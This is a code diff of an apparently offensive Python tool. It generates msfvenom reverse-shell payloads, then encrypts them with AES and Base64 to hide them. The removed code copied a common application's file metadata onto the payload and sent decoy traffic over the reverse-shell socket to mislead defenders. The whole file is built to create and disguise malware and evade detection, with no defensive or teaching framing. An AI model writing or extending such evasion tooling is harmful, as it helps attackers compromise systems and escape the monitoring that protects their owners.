@@ -1,17 +1,15 @@
-import subprocess
 import os
 import shutil
+import subprocess
 import base64
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
 from cryptography.fernet import Fernet
-import random
-import time
-import stat
 
 SHELLS_DIR = "generated_shells"
 if not os.path.exists(SHELLS_DIR):
     os.makedirs(SHELLS_DIR)
     print(f"[INFO] Created directory for shells: {SHELLS_DIR}")
-
 
 # Function: Generate Shell
 def generate_msfvenom_shell(payload, lhost, lport, output_format, output_name):
@@ -33,68 +31,47 @@ def generate_msfvenom_shell(payload, lhost, lport, output_format, output_name):
         print(f"[ERROR] Failed to generate shell: {e}")
         return None
 
-
-# Function: Mimic Common Applications
-def mimic_application(file_path, common_app_path):
-    """
-    Modify the generated shell to mimic a common application.
-    
-    :param file_path: Path to the generated shell.
-    :param common_app_path: Path to a common application to mimic.
-    """
+# AES Encryption Functions
+def aes_encrypt(data, key):
     try:
-        # Copy file attributes
-        shutil.copystat(common_app_path, file_path)
-        print(f"[INFO] Mimicked attributes of {common_app_path} for {file_path}")
+        cipher = AES.new(key, AES.MODE_CBC)
+        iv = cipher.iv
+        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
+        return iv + encrypted_data
     except Exception as e:
-        print(f"[ERROR] Failed to mimic application attributes: {e}")
+        print(f"[ERROR] AES encryption failed: {e}")
+        return None
 
-
-# Function: Send False Positive Data
-def send_false_positive_traffic(socket, decoy_data, frequency=5):
-    """
-    Send false positive traffic during the reverse shell session.
-
-    :param socket: Active socket connection for reverse shell.
-    :param decoy_data: List of benign data strings to send.
-    :param frequency: Frequency in seconds to send decoy traffic.
-    """
+def aes_decrypt(encrypted_data, key):
     try:
-        while True:
-            decoy_message = random.choice(decoy_data)
-            socket.sendall(decoy_message.encode("utf-8"))
-            print(f"[INFO] Sent decoy data: {decoy_message}")
-            time.sleep(frequency)
+        iv = encrypted_data[:16]
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        decrypted_data = unpad(cipher.decrypt(encrypted_data[16:]), AES.block_size)
+        return decrypted_data
     except Exception as e:
-        print(f"[ERROR] Failed to send false positive traffic: {e}")
+        print(f"[ERROR] AES decryption failed: {e}")
+        return None
 
-
-# Function: Copy File Metadata
-def copy_file_attributes(source_path, target_path):
-    """
-    Copy metadata such as creation date, modification date, and permissions from one file to another.
-
-    :param source_path: Path to the source file.
-    :param target_path: Path to the target file.
-    """
+# Base64 Encoding Functions
+def base64_encode(data):
     try:
-        shutil.copystat(source_path, target_path)
-        print(f"[INFO] Copied file attributes from {source_path} to {target_path}")
+        encoded = base64.b64encode(data)
+        print("[INFO] Data successfully encoded in Base64.")
+        return encoded
     except Exception as e:
-        print(f"[ERROR] Failed to copy file attributes: {e}")
+        print(f"[ERROR] Base64 encoding failed: {e}")
+        return None
 
+def base64_decode(encoded_data):
+    try:
+        decoded = base64.b64decode(encoded_data)
+        print("[INFO] Data successfully decoded from Base64.")
+        return decoded
+    except Exception as e:
+        print(f"[ERROR] Base64 decoding failed: {e}")
+        return None
 
-# Example Function: Generate Decoy Traffic for Reverse Shell
-def example_decoy_traffic():
-    return [
-        "GET /index.html HTTP/1.1",
-        "POST /api/login HTTP/1.1",
-        "200 OK",
-        "<html><body>Sample traffic</body></html>",
-    ]
-
-
-# Encryption Functions (Unchanged)
+# Function: Encrypt Shell (AES + Base64)
 def encrypt_shell(shell_path, encryption_key):
     if not os.path.exists(shell_path):
         print(f"[ERROR] Shell file not found: {shell_path}")
@@ -105,11 +82,16 @@ def encrypt_shell(shell_path, encryption_key):
         with open(shell_path, "rb") as shell_file:
             shell_data = shell_file.read()
 
-        fernet = Fernet(encryption_key)
-        encrypted_data = fernet.encrypt(shell_data)
+        aes_encrypted = aes_encrypt(shell_data, encryption_key)
+        if aes_encrypted is None:
+            return None
+
+        base64_encrypted = base64_encode(aes_encrypted)
+        if base64_encrypted is None:
+            return None
 
         with open(encrypted_path, "wb") as encrypted_file:
-            encrypted_file.write(encrypted_data)
+            encrypted_file.write(base64_encrypted)
 
         print(f"[SUCCESS] Encrypted shell saved to: {encrypted_path}")
         return encrypted_path
@@ -117,8 +99,36 @@ def encrypt_shell(shell_path, encryption_key):
         print(f"[ERROR] Failed to encrypt shell: {e}")
         return None
 
+# Function: Decrypt Shell (Base64 + AES)
+def decrypt_shell(encrypted_path, encryption_key):
+    if not os.path.exists(encrypted_path):
+        print(f"[ERROR] Encrypted shell file not found: {encrypted_path}")
+        return None
 
-def generate_encryption_key():
-    key = Fernet.generate_key()
-    print(f"[INFO] Encryption key generated: {key.decode()}")
+    decrypted_path = encrypted_path.replace(".enc", "_decrypted")
+    try:
+        with open(encrypted_path, "rb") as encrypted_file:
+            encrypted_data = encrypted_file.read()
+
+        base64_decoded = base64_decode(encrypted_data)
+        if base64_decoded is None:
+            return None
+
+        aes_decrypted = aes_decrypt(base64_decoded, encryption_key)
+        if aes_decrypted is None:
+            return None
+
+        with open(decrypted_path, "wb") as decrypted_file:
+            decrypted_file.write(aes_decrypted)
+
+        print(f"[SUCCESS] Decrypted shell saved to: {decrypted_path}")
+        return decrypted_path
+    except Exception as e:
+        print(f"[ERROR] Failed to decrypt shell: {e}")
+        return None
+
+# Example: Generate Encryption Key
+def generate_aes_key():
+    key = os.urandom(16)  # 16 bytes for AES-128
+    print(f"[INFO] AES key generated: {base64.b64encode(key).decode()}")
     return key
